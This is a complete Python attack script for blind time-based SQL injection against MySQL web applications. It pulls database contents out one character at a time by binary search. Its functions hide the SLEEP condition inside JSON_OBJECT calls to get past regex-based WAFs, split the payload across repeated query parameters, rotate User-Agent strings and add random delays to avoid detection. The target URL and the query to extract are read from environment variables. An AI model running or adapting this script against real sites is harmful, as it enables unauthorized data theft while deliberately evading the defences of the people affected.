import requests
import random
import time
import os
import sys
from urllib.parse import quote

# ==============================================================================
# OPERATIONAL CONSTANTS
# ==============================================================================
USER_AGENT_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1"
]

# Time-based threshold: SLEEP duration should be significantly higher than network latency
SLEEP_DURATION = 5.0
RESPONSE_THRESHOLD = 4.5 

def initialize_session():
    """
    Initializes a requests session with environment-aware proxy configuration 
    to ensure operational autonomy across different network topologies.
    """
    session = requests.Session()
    # Inherit system proxy settings from environment variables (HTTP_PROXY, HTTPS_PROXY)
    proxies = {k.lower().replace('http_proxy', 'http'): v for k, v in os.environ.items() if 'proxy' in k.lower()}
    if proxies:
        session.proxies.update(proxies)
    # Disable SSL verification if operating within a controlled internal audit environment
    session.verify = os.environ.get("SKIP_SSL", "False").lower() == "true"
    return session

def craft_evasive_payload(position, threshold, target_query):
    """
    Constructs an evasive MySQL payload leveraging JSON object construction anomalies.
    
    Technical Mechanism:
    The WAF typically scans for 'IF(SUBSTRING(...))' or bare 'SLEEP()'. 
    By wrapping the logic in JSON_OBJECT(), we force the MySQL engine to evaluate the 
    conditional expression during the object creation phase, effectively hiding 
    the trigger from regex-based inspection.
    """
    # Use MID() instead of SUBSTRING() and ASCII() for numerical comparison
    condition = f"ASCII(MID(({target_query}),{position},1))>{threshold}"
    
    # Construct an anomaly: JSON_EXTRACT parses a JSON_OBJECT created on-the-fly.
    # The IF statement is evaluated during the construction of the 'v' key value.
    sql_logic = (
        f"JSON_EXTRACT(JSON_OBJECT('v',IF({condition},SLEEP({SLEEP_DURATION}),0)),'$.v')"
    )

    # Prepend a decoy JSON structure to confuse WAFs expecting API-style JSON requests
    json_prefix = '{"audit_id":"val_7721","session":"active"}'
    
    # HTTP Parameter Fragmentation (HPF): Split the payload into segments.
    # This targets backends that concatenate multiple parameters of the same name,
    # ensuring the WAF never sees the complete SQL signature in a single parameter value.
    return [
        f"{json_prefix}'", 
        " AND ", 
        f"({sql_logic})", 
        " -- -"
    ]

def transmit_request(session, target_url, param_key, fragments):
    """
    Executes the fragmented request with randomized jitter and User-Agent rotation.
    """
    ua = random.choice(USER_AGENT_POOL)
    headers = {
        "User-Agent": ua, 
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Connection": "keep-alive"
    }

    # Implement HPF by sending the same parameter key multiple times in the query string.
    # This bypasses WAFs that only inspect unique parameters or fail to normalize duplicates.
    qs_parts = [f"{param_key}={quote(frag)}" for frag in fragments]
    connector = "&" if "?" in target_url else "?"
    full_url = f"{target_url}{connector}{'&'.join(qs_parts)}"

    start_time = time.perf_counter()
    try:
        # Timeout set slightly above SLEEP_DURATION to account for server processing
        response = session.get(full_url, headers=headers, timeout=SLEEP_DURATION + 3)
    except requests.exceptions.RequestException:
        return False

    elapsed = time.perf_counter() - start_time
    
    # Network Jitter: Disrupt behavioral analysis and rate-limiting signatures
    time.sleep(random.uniform(2.0, 7.0))

    return elapsed >= RESPONSE_THRESHOLD

def binary_search_extract(session, target_url, param_key, query):
    """
    Performs a high-efficiency extraction using a binary search algorithm
    over the printable ASCII range (32-126).
    """
    extracted_string = []
    print(f"[*] Initiating stealthy extraction via JSON anomaly vector...")

    for position in range(1, 64):  # Maximum expected length of data
        low, high = 32, 126
        char_found = False
        
        while low <= high:
            mid = (low + high) // 2
            fragments = craft_evasive_payload(position, mid, query)
            
            if transmit_request(session, target_url, param_key, fragments):
                low = mid + 1
            else:
                high = mid - 1

        # Check if the converged value is within printable ASCII range
        if 32 <= low <= 126:
            extracted_string.append(chr(low))
            print(f"[+] Position {position:02d} resolved: {chr(low)} | Current: {''.join(extracted_string)}")
        else:
            # If the value falls outside printable range, we have reached the end of the string
            break

    return "".join(extracted_string)

def main():
    """
    Main operational entry point. Configuration is ingested via environment variables
    to maintain professional autonomy and integration readiness for CI/CD pipelines.
    """
    target = os.environ.get("TARGET_URL")
    param = os.environ.get("VULN_PARAM")
    query = os.environ.get("SENSITIVE_QUERY", "SELECT user()")

    if not target or not param:
        print("[!] Critical Configuration Missing.")
        print("Usage: export TARGET_URL='http://target.com/vuln' VULN_PARAM='id'")
        sys.exit(1)

    session = initialize_session()
    try:
        result = binary_search_extract(session, target, param, query)
        print(f"\n[+] Extraction Complete.")
        print(f"[+] Recovered Data: {result}")
    except KeyboardInterrupt:
        print("\n[-] Operation terminated by operator.")

if __name__ == "__main__":
    main()
